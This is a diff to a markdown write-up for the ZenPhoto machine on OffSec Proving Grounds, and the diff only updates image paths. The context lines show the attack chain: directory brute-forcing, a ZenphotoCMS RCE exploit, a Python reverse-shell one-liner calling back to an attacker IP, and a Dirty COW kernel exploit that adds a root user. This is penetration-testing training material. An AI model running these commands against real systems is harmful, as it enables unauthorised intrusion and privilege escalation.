@@ -52,13 +52,13 @@ Site at 80 port doesn't look like anything special, so we execute a directory tr
 feroxbuster --url http://192.168.247.41 -w /usr/share/wordlists/dirb/common.txt
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/ZenPhoto/ZenPhoto_2022.01.31_0h43m18s_001.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_0h43m18s_001.png)
 
 Browsing to the URL ```http://192.168.247.41/test/index.php``` we can know that the site is running ZenphotoCMS and version is 1.4.1.4.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/ZenPhoto/ZenPhoto_2022.01.31_1h19m29s_002.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_1h19m29s_002.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/ZenPhoto/ZenPhoto_2022.01.31_1h20m29s_003.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_1h20m29s_003.png)
 
 We use this RCE [exploit](https://www.exploit-db.com/exploits/18083).
 
@@ -66,7 +66,7 @@ We use this RCE [exploit](https://www.exploit-db.com/exploits/18083).
 php 18083.php 192.168.227.41 /test/
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/ZenPhoto/ZenPhoto_2022.01.31_16h13m44s_004.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_16h13m44s_004.png)
 
 #### Privilege Escalation
 
@@ -76,11 +76,11 @@ We need a fully funcational shell. Starting a new Listener.
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.227",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/ZenPhoto/ZenPhoto_2022.01.31_16h33m0s_005.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_16h33m0s_005.png)
 
 Running linpeas.sh script to check for privilege escalation. From the results, we can find that the kernel is an old version.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/ZenPhoto/ZenPhoto_2022.01.31_17h50m31s_006.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_17h50m31s_006.png)
 
 I use this kernel [exploit](https://www.exploit-db.com/exploits/40839) to try to create a new root user.
 
@@ -92,8 +92,8 @@ chmod +x 40839
 ./40839
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/ZenPhoto/ZenPhoto_2022.01.31_18h6m15s_007.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_18h6m15s_007.png)
 
 Using SSH to log in, the account is ```firefart``` and the password is we entered when using the exploit.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/ZenPhoto/ZenPhoto_2022.01.31_18h6m51s_008.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_18h6m51s_008.png)
